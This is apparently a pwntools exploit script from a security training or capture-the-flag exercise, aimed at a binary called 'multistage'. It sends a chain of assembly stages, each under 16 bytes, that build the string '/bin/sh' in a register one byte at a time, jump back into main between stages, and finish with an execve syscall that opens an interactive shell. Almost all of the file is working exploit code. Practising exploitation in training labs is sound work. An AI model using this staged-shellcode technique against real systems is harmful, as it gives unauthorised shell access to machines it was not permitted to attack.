# STRATEGY: Try to jump to before the shellcode is read to set up multistage.

from pwn import *
from time import sleep

elf = ELF('./multistage')
context.arch = 'amd64'
# context.terminal = ['alacritty', '-e', 'sh', '-c']
# context.terminal = ['konsole', '-e', 'sh', '-c']
context.terminal = ['konsole', '-e']

if 'REM' in os.environ:
    p = remote('multistage.training.offensivedefensive.it', 8080, ssl=True)
else:
    if 'GDB' in os.environ:
        print('DEBUG MODE')
        p = gdb.debug('./multistage', api=True, gdbscript='''
        b *0x00401236
        c
        ''')
    else:
        p = elf.process()

# mov rdi, 0x0068732f6e69622f
# mov edi, 0xe69622f
# push rdi
# mov rax, 0x{(elf.address + 0x00401196):x}

def stop(s):
    if 'NOSTP' not in os.environ: input(s)
    else: sleep(1)

def send(sh, wait=False):
    log.info(f'shellcode: {sh}')
    l = len(asm(sh))

    if l >= 16:
        raise Exception(f'Shellcode too big:\n{sh}\nlen: {l}\n')

    log.info(f'shellcode len: {l}')
    log.info(p.clean())
    p.sendline(asm(sh))

    if wait: stop('Waiting...')
    # else: p.gdb.execute('c')

jmp_main       = 0x00401196 # main (beginning)
jmp_read_setup = 0x00401212 # ...
jmp_read       = 0x00401227 # ...
jmp_mmap_setup = 0x004011ed # ...
def write(byt, wait=False, shift=True, final_jmp=jmp_main):
    send(f'''
    or r15, {byt}
    mov rax, {jmp_main}
    jmp rax
    ''', wait=wait)

    if shift:
        send(f'''
        shl r15, 8
        mov rax, {final_jmp}
        jmp rax
        ''', wait=wait)

# NB. /bin/sh: 0x0068732f6e69622f

log.info(f'Clean: {p.clean()}')

# /bin/sh: Fill bottom 32-bit.
send(f'''
mov r15d, 0x0068732f
mov rax, 0x00401196
jmp rax
''', wait=True)

# /bin/sh: Shift them left.
send(f'''
shl r15, 8
mov rax, 0x00401196
jmp rax
''', wait=True)

write('0x6e', wait=True)
write('0x69', wait=True)
write('0x62', wait=True)
write('0x2f', wait=True, shift=False) # write('0x2f', wait=True, shift=False, final_jmp=0x00401227)

send(f'''
push r15
mov r15, rsp
mov rax, {jmp_main}
jmp rax
''')

# xor rax, rax
# mov al, 0x3b
# mov rdi, r15
# xor rsi, rsi
# xor rdx, rdx
# syscall
send(f'''
xor rax, rax
mov al, 0x3b
mov rdi, r15
xor rsi, rsi
syscall
''', wait=True)

p.interactive()